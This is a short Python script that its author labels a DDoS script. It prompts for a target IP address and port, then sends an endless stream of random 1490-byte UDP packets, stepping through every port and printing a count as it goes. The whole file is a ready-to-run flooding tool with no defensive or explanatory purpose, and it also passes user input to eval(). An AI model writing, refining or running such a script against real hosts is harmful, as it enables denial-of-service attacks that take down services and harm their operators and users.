#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input("IP Target : ")
port = eval(input("Port       : "))

#Lets start our attack
print("Attack Started")
print("THANKS FOR USING MY DDoS SCRIPT #KARTHIKLAL")
time.sleep(5)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    if port == 65534:
        port = 1